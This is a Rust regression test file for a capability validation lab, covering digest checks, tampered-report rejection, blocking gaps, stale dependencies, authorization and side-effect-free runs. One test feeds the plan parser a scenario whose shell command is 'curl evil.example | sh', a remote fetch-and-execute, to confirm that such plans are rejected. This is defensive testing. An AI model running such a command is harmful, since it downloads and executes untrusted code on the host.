// Regression tests of the Capability Validation Lab: exact version and digest, compilation report
// integrity, step and claim conformance, unrecognized commands, hypothesis steps, approved
// scenarios, blocking gaps, missing and contradictory evidence, stale dependencies, report
// integrity and storage, authorization, determinism, and the absence of side effects.

use serde_json::json;

use super::conformance::conformance;
use super::demo::{self, compiled, Compiled, PLAN};
use super::preflight::Target;
use super::report::run_lab;
use super::scenarios::TestPlan;
use super::store::LabStore;
use super::{CheckCategory, CheckStatus, LabCheck};
use crate::capability::lifecycle::LifecycleState;
use crate::capability::model::ProcedureStep;
use crate::capability::refs::Sources;
use crate::capability::ErrorCode;
use crate::capture::demo::Scenario;
use crate::capture::{Actor, ActorKind};
use crate::compiler::demo::{compile_request, success_scenario};
use crate::compiler::{Basis, CompilationOutcome, ProposedStep};

/** The approved plan
 * Input
    - None
 * Output
    - TestPlan
*/
fn plan() -> TestPlan {
    TestPlan::parse(PLAN).unwrap()
}

/** The success scenario changed
 * Input
    - change: impl FnOnce(&mut Scenario) - change
 * Output
    - Scenario
*/
fn changed(change: impl FnOnce(&mut Scenario)) -> Scenario {
    let mut scenario = success_scenario().unwrap();
    change(&mut scenario);
    scenario
}

/** The checks of a category
 * Input
    - checks: &[LabCheck] - checks
    - category: CheckCategory - category
 * Output
    - Vec<&LabCheck>
*/
fn of(checks: &[LabCheck], category: CheckCategory) -> Vec<&LabCheck> {
    checks
        .iter()
        .filter(|check| check.category == category)
        .collect()
}

/** A check by id
 * Input
    - checks: &[LabCheck] - checks
    - id: &str - check id
 * Output
    - &LabCheck
*/
fn by_id<'a>(checks: &'a [LabCheck], id: &str) -> &'a LabCheck {
    checks
        .iter()
        .find(|check| check.check_id == id)
        .unwrap_or_else(|| panic!("no check {id}"))
}

/** The compiled candidate conforms to its sources and passes every approved scenario; the run is
 * still inconclusive, and the report references everything it relied on
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn checks_a_compiled_candidate() {
    let world = compiled(&success_scenario().unwrap()).unwrap();
    let report = world.lab(&world.report, &plan()).unwrap();
    assert_eq!((report.summary.failed, report.summary.blocked), (0, 0));
    assert_eq!(
        report.overall,
        CheckStatus::Inconclusive,
        "one episode never proves general applicability"
    );
    assert!(
        by_id(&report.checks, "invariant:assumption:single-episode").status
            == CheckStatus::Inconclusive
    );
    let steps = of(&report.checks, CheckCategory::Conformance)
        .into_iter()
        .filter(|check| !check.check_id.contains("claim:"))
        .collect::<Vec<_>>();
    assert_eq!(steps.len(), 9);
    assert!(steps.iter().all(|check| check.status == CheckStatus::Passed
        && check.basis == Some(Basis::Observed)
        && check.evidence_refs.len() == 1));
    assert!(of(&report.checks, CheckCategory::Scenario)
        .iter()
        .all(|check| check.status == CheckStatus::Passed));
    assert_eq!(
        by_id(
            &report.checks,
            "invariant:business-invariant:inv-no-double-refund"
        )
        .status,
        CheckStatus::Passed
    );
    assert_eq!(
        by_id(&report.checks, "conformance:claim:acceptance-ac-1").basis,
        Some(Basis::Declared),
        "bases are preserved, not upgraded"
    );
    assert!(report.verify_digest());
    let target = world.target().unwrap();
    assert_eq!(
        (report.candidate_digest.as_str(), report.candidate_state),
        (
            target.expected_digest.as_str(),
            Some(LifecycleState::Candidate)
        )
    );
    assert_eq!(
        report.compilation.as_ref().unwrap().report_id,
        world.report.report_id
    );
    assert_eq!(
        (
            report.test_plan.digest.clone(),
            report.test_plan.scenarios.len()
        ),
        (plan().digest(), 7)
    );
    assert_eq!(report.governance.zones["refunds"], "v3");
    assert!(
        !report.environment.executed && report.environment.scope_environments == vec!["production"]
    );
    assert!(
        report
            .limitations
            .iter()
            .any(|limitation| limitation.contains("chronological"))
            && report
                .limitations
                .iter()
                .any(|limitation| limitation.contains("branch note"))
    );
    assert!(report.meaning.contains("only the conditions they tested"));
    assert!(!report.evidence_refs.is_empty());
}

/** Only the exact version and digest are examined, with its own compilation report
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn examines_the_exact_version() {
    let mut world = compiled(&success_scenario().unwrap()).unwrap();
    let reader = crate::capability::demo::reader(&world.cast.engineer).unwrap();
    let mut wrong = world.target().unwrap();
    wrong.expected_digest = "0".repeat(32);
    let sources = Sources {
        capture: &world.capture.store,
        current: &world.current,
        reader: &reader,
    };
    let report = run_lab(
        &world.registry,
        &sources,
        &world.cast.engineer,
        &wrong,
        Some(&world.report),
        &plan(),
        demo::NOW,
    )
    .unwrap();
    assert_eq!(
        by_id(&report.checks, "preflight:candidate-digest").status,
        CheckStatus::Failed
    );
    assert!(of(&report.checks, CheckCategory::Scenario)
        .iter()
        .all(|check| check.status == CheckStatus::NotRun));
    assert_eq!(report.overall, CheckStatus::Failed);
    let missing = Target {
        version: 7,
        ..world.target().unwrap()
    };
    let report = run_lab(
        &world.registry,
        &sources,
        &world.cast.engineer,
        &missing,
        Some(&world.report),
        &plan(),
        demo::NOW,
    )
    .unwrap();
    assert_eq!(report.overall, CheckStatus::Blocked);
    let mut revised = compile_request(&world.capture.store.packs.values().next().unwrap().clone());
    revised.purpose = "A revised purpose".into();
    let sources = Sources {
        capture: &world.capture.store,
        current: &world.current,
        reader: &reader,
    };
    let second = crate::compiler::assemble::compile(
        &mut world.registry,
        &sources,
        &world.cast.engineer,
        &revised,
        demo::NOW,
    );
    assert_eq!(second.candidate.as_ref().unwrap().version, 2);
    let target = Target {
        capability_id: second.candidate.as_ref().unwrap().capability_id.clone(),
        version: 2,
        expected_digest: second.candidate.as_ref().unwrap().digest.clone(),
    };
    let report = run_lab(
        &world.registry,
        &sources,
        &world.cast.engineer,
        &target,
        Some(&world.report),
        &plan(),
        demo::NOW,
    )
    .unwrap();
    assert_eq!(
        by_id(&report.checks, "preflight:compilation-report").status,
        CheckStatus::Failed,
        "version 1's report does not describe version 2"
    );
    world
        .registry
        .withdraw(
            &world.cast.lead,
            &target.capability_id,
            Some(2),
            LifecycleState::Rejected,
            "superseded",
            demo::NOW,
        )
        .unwrap();
    let sources = Sources {
        capture: &world.capture.store,
        current: &world.current,
        reader: &reader,
    };
    let report = run_lab(
        &world.registry,
        &sources,
        &world.cast.engineer,
        &target,
        Some(&second),
        &plan(),
        demo::NOW,
    )
    .unwrap();
    assert_eq!(
        by_id(&report.checks, "preflight:candidate-state").status,
        CheckStatus::Blocked
    );
}

/** A compilation report changed after it was written fails preflight, and nothing is traced
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn rejects_altered_compilation_reports() {
    let world = compiled(&success_scenario().unwrap()).unwrap();
    let mut altered = world.report.clone();
    altered.gaps.clear();
    let report = world.lab(&altered, &plan()).unwrap();
    assert_eq!(
        by_id(&report.checks, "preflight:compilation-report").status,
        CheckStatus::Failed
    );
    assert_eq!(
        by_id(&report.checks, "conformance:all").status,
        CheckStatus::NotRun
    );
    assert_eq!(report.overall, CheckStatus::Failed);
}

/** A candidate compiled with needs_more_evidence is examined, but its blocking gaps stay blocked
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn does_not_bypass_blocking_gaps() {
    let scenario = changed(|scenario| {
        let ci = scenario
            .resources
            .iter_mut()
            .find(|resource| resource.resource_id == "ci")
            .unwrap();
        ci.records.retain(|record| {
            record.evidence_type != crate::capture::format::record::EvidenceType::TestReport
        });
    });
    let world = compiled(&scenario).unwrap();
    assert_eq!(world.report.outcome, CompilationOutcome::NeedsMoreEvidence);
    let report = world.lab(&world.report, &plan()).unwrap();
    assert_eq!(report.overall, CheckStatus::Blocked);
    assert!(
        report
            .checks
            .iter()
            .filter(|check| check.check_id.starts_with("preflight:blocking-gap"))
            .count()
            >= 2
    );
    assert_eq!(
        by_id(&report.checks, "invariant:claim:tests-passed").status,
        CheckStatus::Blocked
    );
    assert_eq!(
        by_id(&report.checks, "conformance:claim:tests-passed").basis,
        Some(Basis::Unknown)
    );
    assert!(!report.checks.iter().any(
        |check| check.check_id.contains("tests-passed") && check.status == CheckStatus::Passed
    ));
}

/** A compiled step that its cited record does not reproduce fails with a counterexample; an
 * unreadable record blocks the check
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn verifies_steps_against_their_records() {
    let world = compiled(&success_scenario().unwrap()).unwrap();
    let target = world.target().unwrap();
    let mut definition = world
        .registry
        .state
        .record(&target.capability_id, 1)
        .unwrap()
        .definition
        .clone();
    definition.execution.steps[6].description = "Deploy the change everywhere".into();
    let reader = crate::capability::demo::reader(&world.cast.engineer).unwrap();
    let sources = Sources {
        capture: &world.capture.store,
        current: &world.current,
        reader: &reader,
    };
    let checks = conformance(&definition, Some(&world.report), &sources);
    let deploy = checks
        .iter()
        .find(|check| {
            check.check_id == format!("conformance:{}", definition.execution.steps[6].step_id)
        })
        .unwrap();
    assert_eq!(deploy.status, CheckStatus::Failed);
    assert_eq!(
        deploy.counterexample.as_ref().unwrap()["re_derived"]["description"],
        json!("Deploy the change to production")
    );
    let mut narrow = reader.clone();
    narrow.resources.remove("datasea");
    let sources = Sources {
        capture: &world.capture.store,
        current: &world.current,
        reader: &narrow,
    };
    let checks = conformance(&definition, Some(&world.report), &sources);
    assert!(
        checks
            .iter()
            .any(|check| check.status == CheckStatus::Blocked
                && check.detail.contains("Unauthorized"))
    );
}

/** Steps classified as changes only because their command was not recognized, and proposed
 * steps, stay inconclusive and are stated as limitations
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn keeps_assumed_and_proposed_steps_inconclusive() {
    let scenario = changed(|scenario| {
        let datasea = scenario
            .resources
            .iter_mut()
            .find(|resource| resource.resource_id == "datasea")
            .unwrap();
        datasea.records[1].content["command"] = json!("make release");
    });
    let world = compiled(&scenario).unwrap();
    let report = world.lab(&world.report, &plan()).unwrap();
    let assumed = report
        .checks
        .iter()
        .find(|check| {
            check.category == CheckCategory::Conformance
                && check.detail.contains("conservative rule")
        })
        .expect("assumed change");
    assert_eq!(assumed.status, CheckStatus::Inconclusive);
    assert!(report
        .limitations
        .iter()
        .any(|limitation| limitation.contains("not recognized")));
    let mut proposed = compiled(&success_scenario().unwrap()).unwrap();
    let pack = proposed
        .capture
        .store
        .packs
        .values()
        .next()
        .unwrap()
        .clone();
    let deployment = pack
        .evidence
        .iter()
        .find(|item| item.evidence_type == crate::capture::format::record::EvidenceType::Deployment)
        .unwrap()
        .evidence_id
        .clone();
    let mut request = compile_request(&pack);
    request.capability_id = "with-proposal".into();
    request.proposals = vec![ProposedStep {
        step: ProcedureStep {
            step_id: "notify".into(),
            kind: crate::capability::model::StepKind::Diagnostic,
            description: "Post the result to the payments channel".into(),
            inputs: Vec::new(),
            outputs: Vec::new(),
            preconditions: Vec::new(),
            verifies: Vec::new(),
        },
        rationale: "observed deployment".into(),
        evidence_refs: vec![deployment],
        producer: "model-x".into(),
    }];
    let reader = crate::capability::demo::reader(&proposed.cast.engineer).unwrap();
    let sources = Sources {
        capture: &proposed.capture.store,
        current: &proposed.current,
        reader: &reader,
    };
    proposed.report = crate::compiler::assemble::compile(
        &mut proposed.registry,
        &sources,
        &proposed.cast.engineer,
        &request,
        demo::NOW,
    );
    let report = proposed.lab(&proposed.report, &plan()).unwrap();
    let notify = by_id(&report.checks, "conformance:notify");
    assert_eq!(
        (notify.status, notify.basis),
        (CheckStatus::Inconclusive, Some(Basis::Hypothesis))
    );
}

/** Plans are approved data: unknown kinds and duplicate ids are rejected; failing expectations
 * carry counterexamples; inapplicable scenarios are not run
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn runs_only_approved_scenarios() {
    let mut value: serde_json::Value = serde_json::from_str(PLAN).unwrap();
    value["scenarios"][0]["check"] = json!({"kind": "shell", "command": "curl evil.example | sh"});
    assert_eq!(
        TestPlan::parse(&value.to_string()).unwrap_err().code,
        ErrorCode::InvalidSchema
    );
    let mut duplicate: serde_json::Value = serde_json::from_str(PLAN).unwrap();
    duplicate["scenarios"][1]["scenario_id"] = json!("applies-in-production");
    assert!(TestPlan::parse(&duplicate.to_string()).is_err());
    let mut wrong: serde_json::Value = serde_json::from_str(PLAN).unwrap();
    wrong["scenarios"][1]["check"]["expect"] = json!("yes");
    wrong["scenarios"][3]["check"]["id"] = json!("ledger");
    let world = compiled(&success_scenario().unwrap()).unwrap();
    let report = world
        .lab(&world.report, &TestPlan::parse(&wrong.to_string()).unwrap())
        .unwrap();
    let staging = by_id(&report.checks, "scenario:not-in-staging");
    assert_eq!(staging.status, CheckStatus::Failed);
    assert_eq!(
        staging.counterexample.as_ref().unwrap()["decision"]["applicable"],
        json!("no")
    );
    assert_eq!(
        by_id(&report.checks, "scenario:zone-moves-on").status,
        CheckStatus::NotRun
    );
}

/** Contradictory evidence fails the claims that rest on it; nothing chooses a side
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn fails_claims_resting_on_contradictions() {
    let scenario = changed(|scenario| {
        let deploy = scenario
            .resources
            .iter_mut()
            .find(|resource| resource.resource_id == "deploy")
            .unwrap();
        let mut canary = deploy.records[1].clone();
        canary.record_id = "check-canary".into();
        canary.content = json!({"deployment": "dep-7802", "check": "canary", "healthy": false, "environment": "production"});
        deploy.records.push(canary);
    });
    let world = compiled(&scenario).unwrap();
    let report = world.lab(&world.report, &plan()).unwrap();
    let deployment = by_id(&report.checks, "invariant:claim:deployment-succeeded");
    assert_eq!(deployment.status, CheckStatus::Failed);
    assert!(
        deployment.counterexample.as_ref().unwrap()["conflicted_assertions"]
            .as_array()
            .is_some_and(|items| !items.is_empty())
    );
    assert_eq!(report.overall, CheckStatus::Failed);
}

/** A stale dependency fails with a counterexample naming it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn fails_stale_dependencies() {
    let mut world = compiled(&success_scenario().unwrap()).unwrap();
    world
        .current
        .flows
        .insert("refund-flow".into(), "v9".into());
    let report = world.lab(&world.report, &plan()).unwrap();
    let flow = by_id(&report.checks, "invariant:dependency:flow:refund-flow");
    assert_eq!(flow.status, CheckStatus::Failed);
    assert_eq!(
        flow.counterexample.as_ref().unwrap()["outcome"],
        json!("stale")
    );
    assert_eq!(
        report.governance.flows["refund-flow"], "v9",
        "the report records the versions it checked against"
    );
}

/** Reports are stored append-only, referenced by exact version, and verified on load; running the
 * lab changes no registry or evidence state
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn stores_reports_without_side_effects() {
    let world = compiled(&success_scenario().unwrap()).unwrap();
    let registry_before = world.registry.state.clone();
    let evidence_before = world.capture.store.evidence.len();
    let report = world.lab(&world.report, &plan()).unwrap();
    assert_eq!(world.registry.state, registry_before);
    assert_eq!(world.capture.store.evidence.len(), evidence_before);
    let directory = tempfile::tempdir().unwrap();
    let store = LabStore::open(directory.path());
    store.append(&report).unwrap();
    let target = world.target().unwrap();
    let references = store.references(&target.capability_id, 1).unwrap();
    assert_eq!(
        (references.len(), references[0].digest.clone()),
        (1, report.digest.clone())
    );
    assert!(store
        .references(&target.capability_id, 2)
        .unwrap()
        .is_empty());
    let mut forged = report.clone();
    forged.overall = CheckStatus::Passed;
    assert_eq!(
        store.append(&forged).unwrap_err().code,
        ErrorCode::IntegrityMismatch
    );
    let path = directory
        .path()
        .join("capability_lab")
        .join("reports.jsonl");
    let text = std::fs::read_to_string(&path)
        .unwrap()
        .replace("\"overall\":\"inconclusive\"", "\"overall\":\"passed\"");
    std::fs::write(&path, text).unwrap();
    assert_eq!(store.load().unwrap_err().code, ErrorCode::IntegrityMismatch);
}

/** Only actors the registry grants a role may run the lab
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn requires_a_role() {
    let world: Compiled = compiled(&success_scenario().unwrap()).unwrap();
    let stranger = Actor::new("stranger@acme.example", ActorKind::Human);
    let reader = crate::capability::demo::reader(&stranger).unwrap();
    let sources = Sources {
        capture: &world.capture.store,
        current: &world.current,
        reader: &reader,
    };
    let error = run_lab(
        &world.registry,
        &sources,
        &stranger,
        &world.target().unwrap(),
        Some(&world.report),
        &plan(),
        demo::NOW,
    )
    .unwrap_err();
    assert_eq!(error.code, ErrorCode::Unauthorized);
}

/** The demonstration is deterministic and covers each outcome
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn runs_the_demonstration() {
    let report = demo::run().unwrap();
    assert_eq!(
        (
            report.compiled.overall,
            report.needs_evidence.overall,
            report.tampered.overall,
            report.stale.overall
        ),
        (
            CheckStatus::Inconclusive,
            CheckStatus::Blocked,
            CheckStatus::Failed,
            CheckStatus::Failed
        )
    );
    assert_eq!(
        serde_json::to_value(demo::run().unwrap()).unwrap(),
        serde_json::to_value(&report).unwrap()
    );
}
